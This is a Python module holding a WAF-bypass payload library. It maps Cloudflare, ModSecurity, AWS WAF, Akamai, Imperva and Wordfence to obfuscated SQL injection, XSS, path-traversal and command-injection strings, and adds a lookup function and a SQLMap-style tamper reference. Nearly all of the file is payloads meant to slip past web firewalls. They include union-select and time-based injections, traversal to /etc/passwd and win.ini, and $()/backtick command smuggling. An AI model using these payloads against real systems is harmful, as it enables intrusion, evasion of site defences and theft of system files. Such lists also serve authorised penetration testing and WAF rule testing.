"""WAF Bypass Payload Library

Bypass payloads categorized by WAF type and vulnerability type.
References SQLMap tamper scripts and community WAF bypass experience.
"""

from typing import Dict, List

# Bypass payload library
BYPASS_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
    # ========== Cloudflare bypass ==========
    "cloudflare": {
        "sqli": [
            # Case obfuscation
            "uNion SeLeCT 1,2,3--",
            "UniOn SelEct 1,2,3,4,5--",
            # Comment obfuscation
            "union/**/select/**/1,2,3--",
            "union/*!50001select*/1,2,3--",
            # Mixed
            "UniOn/**/SeLeCt/**/1,2,3--",
            # Space replacement
            "union\t select 1,2,3--",
            "union\x0bselect 1,2,3--",
            # URL encoding
            "union%20select%201,2,3--",
            "union%0aselect%0a1,2,3--",
            # Double URL encoding
            "union%2520select%25201,2,3--",
        ],
        "xss": [
            # Case obfuscation
            "<ScRiPt>alert(1)</sCrIpT>",
            "<IMG SRC=j&#97;vascript:alert(1)>",
            # Event handler obfuscation
            "<svg onload=alert(1)>",
            '<IMG SRC="x" ONERROR="alert(1)">',
            # Comment obfuscation
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "<scr/**/ipt>alert(1)</scr/**/ipt>",
            # Unicode encoding
            "<\u0073\u0063\u0072\u0069\u0070\u0074>alert(1)</script>",
            # Mixed
            "<ScRiPt>al\u0065rt(1)</sCrIpT>",
        ],
        "lfi": [
            # Path obfuscation
            "....//....//....//etc/passwd",
            "....\\/....\\/....\\/etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            # Encoding bypass
            "/etc/passwd%00",
            "/etc/passwd%00.jpg",
            # Comment obfuscation
            "/etc/*/passwd",
            "/etc/***/passwd",
        ],
        "cmdi": [
            # Pipe character obfuscation
            "cat /etc/passwd|ls",
            "cat /etc/passwd%0als",
            # Command obfuscation
            "cat${IFS}/etc/passwd",
            "cat\x09/etc/passwd",
            # Encoding
            "cat /etc/passwd%0a",
            # Combined
            "cat%09/etc/passwd|ls%0a",
        ],
    },
    # ========== ModSecurity bypass ==========
    "modsecurity": {
        "sqli": [
            # Comment obfuscation (most important)
            "union/*!50001select*/1,2,3--",
            "union/*!50000select*/1,2,3--",
            "union/*!12345select*/1,2,3--",
            # Inline comment version detection bypass
            "/*!50001union*/ /*!50001select*/1,2,3--",
            # Double encoding
            "union%2500select%25001,2,3--",
            "union%2520select%25201,2,3--",
            # Space replacement
            "union%09select%091,2,3--",
            "union%0bselect%0b1,2,3--",
            "union%0cselect%0c1,2,3--",
            "union%a0select%a01,2,3--",
            # Floating point
            "union select 1,2,3 from users where id=1.0",
            # Parentheses
            "union(select(1),2,3)",
        ],
        "xss": [
            # Event handler obfuscation
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            # Tag obfuscation
            "<script /onload=alert(1)>",
            # Unicode
            "<script>al\\u0065rt(1)</script>",
            # Encoding
            "<script>alert(String.fromCharCode(49))</script>",
        ],
        "lfi": [
            # Double encoding
            "..%252f..%252f..%252fetc/passwd",
            "..%255c..%255c..%255cwindows\\win.ini",
            # Null byte
            "../../etc/passwd%00.jpg",
            # Path obfuscation
            "....//....//etc/passwd",
        ],
        "cmdi": [
            # Newline
            "cat /etc/passwd%0a id",
            # Tab character
            "cat\x09/etc/passwd",
            # $() substitution
            "$(cat /etc/passwd)",
            # Backtick
            "`cat /etc/passwd`",
        ],
    },
    # ========== AWS WAF bypass ==========
    "aws_waf": {
        "sqli": [
            # JSON body
            '{"id": "1 OR 1=1"}',
            # Chunked transfer
            # (requires manually setting Transfer-Encoding: chunked)
            # Combined approach
            "union%20select%201,2,3--",
        ],
        "xss": [
            "<svg onload=alert(1)>",
            # Encoding
            "<script>alert(/xss/)</script>",
        ],
        "lfi": [
            "/etc/passwd",
            "../../../etc/passwd",
        ],
        "cmdi": [
            "id",
            "ls",
        ],
    },
    # ========== Akamai bypass ==========
    "akamai": {
        "sqli": [
            # Case
            "UniOn SeLeCt 1,2,3--",
            # Unicode obfuscation
            "un\u0069on sel\u0065ct 1,2,3--",
            # Comment
            "union/**/select/**/1,2,3--",
        ],
        "xss": [
            # Unicode
            "<\u0073\u0063\u0072\u0069\u0070\u0074>alert(1)</script>",
            # Mixed
            "<ScRiPt>alert(1)</sCrIpT>",
        ],
        "lfi": [
            "..%252f..%252f..%252fetc/passwd",
            "....//....//....//etc/passwd",
        ],
        "cmdi": [
            "cat${IFS}/etc/passwd",
            "cat%09/etc/passwd",
        ],
    },
    # ========== Incapsula/Imperva bypass ==========
    "incapsula": {
        "sqli": [
            # HTTP Parameter Pollution (HPP)
            "id=1&id=2 OR 1=1--",
            "id=1/**/OR/**/1=1--",
            # Split payload
            "id=1' UNI",
            "ON SEL",
            "ECT 1,2,3--",
            # Comment
            "union/*a*/select/*b*/1,2,3--",
        ],
        "xss": [
            # Event handler
            "<img src=x onerror=alert(1)>",
            # Keyword detection bypass
            "<scr\x00ipt>",
            # Multi-layer encoding
        ],
        "lfi": [
            "../../etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
        ],
        "cmdi": [
            "id",
            "ls",
        ],
    },
    # ========== Wordfence bypass ==========
    "wordfence": {
        "sqli": [
            # Time delay
            "1' AND SLEEP(5)--",
            "1' AND (SELECT SLEEP(5))--",
            # Comment obfuscation
            "1'/**/AND/**/1=1--",
            # Split
            "1' UN",
            "ION SEL",
            "ECT 1--",
        ],
        "xss": [
            # Time-based trigger
            "<script>setTimeout(alert(1),1000)</script>",
            # Encoding
        ],
        "lfi": [
            "/etc/passwd",
        ],
        "cmdi": [
            # Ping delay
            "ping -c 5 127.0.0.1",
        ],
    },
    # ========== Default bypass (generic) ==========
    "default": {
        "sqli": [
            # Standard obfuscation
            "1' OR '1'='1",
            "1' OR 1=1--",
            "admin'--",
            "admin' #",
            # Union
            " UNION SELECT 1,2,3--",
            " UNION ALL SELECT 1,2,3,4,5--",
            # Blind injection
            "1' AND 1=1--",
            "1' AND 1=2--",
            # Error-based injection
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            # Comment
            "1'/*comment*/OR/*comment*/1=1--",
        ],
        "xss": [
            # Basic
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            # Event
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            # Other tags
            "<iframe src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
        ],
        "lfi": [
            # Basic
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "c:\\windows\\win.ini",
            # Common paths
            "../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
        ],
        "cmdi": [
            # Linux
            "id",
            "cat /etc/passwd",
            "ls -la",
            "whoami",
            "uname -a",
            # Windows
            "dir",
            "type c:\\windows\\win.ini",
            "ipconfig",
            "whoami /all",
        ],
    },
}


def get_bypass_payloads(waf_type: str = "default", vuln_type: str = "sqli") -> List[str]:
    """Get bypass payloads"""
    if waf_type in BYPASS_PAYLOADS:
        if vuln_type in BYPASS_PAYLOADS[waf_type]:
            return BYPASS_PAYLOADS[waf_type][vuln_type]

    return BYPASS_PAYLOADS.get("default", {}).get(vuln_type, [])


# SQLMap-style tamper script reference
TAMPER_SCRIPTS = {
    "space2comment": "Replace space with comment",
    "space2hash": "Replace space with #%0a",
    "space2mysqlblank": "Replace space with MySQL blank characters",
    "space2mysqldash": "Replace space with --%0a",
    "space2plus": "Replace space with +",
    "charencode": "URL encoding",
    "charunicodeencode": "Unicode encoding",
    "between": "Replace AND with BETWEEN",
    "percentage": "Prepend % prefix",
    "ifnull2ifisnull": "Replace IFNULL with IF IS NULL",
}


if __name__ == "__main__":
    # Test
    payloads = get_bypass_payloads("cloudflare", "sqli")
    print(f"Cloudflare SQLi bypasses: {len(payloads)}")
    for p in payloads[:5]:
        print(f"  {p}")
